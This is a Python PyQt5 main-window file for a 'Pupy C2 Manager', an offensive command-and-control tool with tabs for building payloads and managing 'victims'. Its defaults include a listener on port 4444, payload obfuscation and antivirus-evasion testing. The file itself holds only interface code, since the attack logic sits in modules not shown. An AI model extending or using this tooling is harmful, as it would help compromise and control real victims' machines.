#!/usr/bin/env python3
"""
Pupy C2 Manager - Complete macOS Application
Professional C2 bundler, victim manager, and command executor
macOS Tahoe Compatible
"""

import sys
import os
import json
from pathlib import Path

from PyQt5.QtWidgets import (
    QApplication,
    QMainWindow,
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QTabWidget,
    QLabel,
    QLineEdit,
    QPushButton,
    QComboBox,
    QFileDialog,
    QMessageBox,
    QTableWidget,
    QTableWidgetItem,
    QTextEdit,
    QSpinBox,
    QCheckBox,
    QProgressBar,
    QSplitter,
    QListWidget,
    QListWidgetItem,
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QIcon, QFont, QColor

from bundler_tab import BundlerTab
from victims_tab import VictimsTab
from settings_tab import SettingsTab
from logs_tab import LogsTab


class PupyC2Manager(QMainWindow):
    """Main application window"""

    def __init__(self):
        super().__init__()
        self.app_title = "Pupy C2 Manager"
        self.app_version = "1.0.0"
        self.config_path = Path.home() / ".pupy_c2_manager"
        self.config_path.mkdir(exist_ok=True)
        self.config = {}  # Initialize config before UI

        self.load_config()
        self.init_ui()

    def init_ui(self):
        """Initialize UI"""
        self.setWindowTitle(f"{self.app_title} v{self.app_version}")
        self.setGeometry(100, 100, 1400, 900)

        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        # Create tabs
        self.tabs = QTabWidget()

        self.bundler_tab = BundlerTab(self)
        self.victims_tab = VictimsTab(self)
        self.settings_tab = SettingsTab(self)
        self.logs_tab = LogsTab(self)

        self.tabs.addTab(self.bundler_tab, "📦 Bundler")
        self.tabs.addTab(self.victims_tab, "👥 Victims")
        self.tabs.addTab(self.logs_tab, "📋 Logs")
        self.tabs.addTab(self.settings_tab, "⚙️ Settings")

        layout.addWidget(self.tabs)

        # Status bar
        self.statusBar().showMessage("Ready")

        self.show()

    def load_config(self):
        """Load configuration"""
        config_file = self.config_path / "config.json"
        if config_file.exists():
            try:
                with open(config_file, "r") as f:
                    self.config = json.load(f)
            except:
                self.config = self.get_default_config()
        else:
            self.config = self.get_default_config()
            self.save_config()

    def save_config(self):
        """Save configuration"""
        config_file = self.config_path / "config.json"
        with open(config_file, "w") as f:
            json.dump(self.config, f, indent=2)

    def get_default_config(self):
        """Get default configuration"""
        return {
            "listener_ip": "0.0.0.0",
            "listener_port": 4444,
            "pupy_path": "/Users/kalilbelgoumri/Desktop/Projet_dev/pupy",
            "output_dir": str(Path.home() / "Pupy_Outputs"),
            "obfuscation_level": 2,
            "auto_test_av": True,
        }

    def log(self, message):
        """Log message to all tabs"""
        self.logs_tab.add_log(message)
        self.statusBar().showMessage(message)


def main():
    """Main entry point"""
    app = QApplication(sys.argv)
    app.setApplicationName("Pupy C2 Manager")
    app.setApplicationVersion("1.0.0")

    window = PupyC2Manager()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
